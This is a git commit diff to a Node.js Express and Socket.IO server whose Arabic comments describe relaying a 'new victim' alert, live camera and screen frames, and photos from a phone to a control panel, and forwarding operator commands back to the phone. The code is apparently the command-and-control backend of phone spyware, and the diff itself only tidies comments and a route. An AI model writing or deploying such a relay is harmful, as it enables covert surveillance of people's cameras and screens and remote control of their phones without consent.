e635c79a8ea6e785a4fb54e3b098432bfd2eb610
hamza734226204-eng <hamza734226204@gmail.com>
2026-05-03 14:49:04 +0300

    Update server.js

--- server.js
+++ server.js
@@ -1,24 +1,20 @@
 const express = require('express');
-const path = require('path');
 const app = express();
 const http = require('http').createServer(app);
 const io = require('socket.io')(http, {
     cors: { origin: "*" },
-    maxHttpBufferSize: 1e8 // لضمان استقبال الصور بجودة عالية
+    maxHttpBufferSize: 1e8 // للسماح بنقل الصور والفريمات الكبيرة
 });
 
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });
 
 io.on('connection', (socket) => {
-    console.log('[!] Connection established');
-
+    // تبليغ عن ضحية جديدة
     socket.on('victim_online', (data) => {
         socket.broadcast.emit('new_victim_alert', { id: socket.id, model: data.model });
     });
 
-    // تمرير البث (كاميرا، شاشة) من الهاتف للوحة
+    // تمرير البث المباشر (كاميرا أو شاشة)
     socket.on('video_frame', (frame) => {
         socket.broadcast.emit('display_frame', { frame: frame });
     });
@@ -28,11 +24,11 @@ io.on('connection', (socket) => {
         socket.broadcast.emit('display_photo', { img: img });
     });
 
-    // تمرير الأوامر من اللوحة للهاتف
+    // تمرير الأوامر من لوحة التحكم للهاتف
     socket.on('admin_command', (data) => {
         socket.broadcast.emit(data.command, data);
     });
 });
 
 const PORT = process.env.PORT || 8080;
-http.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
+http.listen(PORT, '0.0.0.0', () => console.log(`Server running on ${PORT}`));
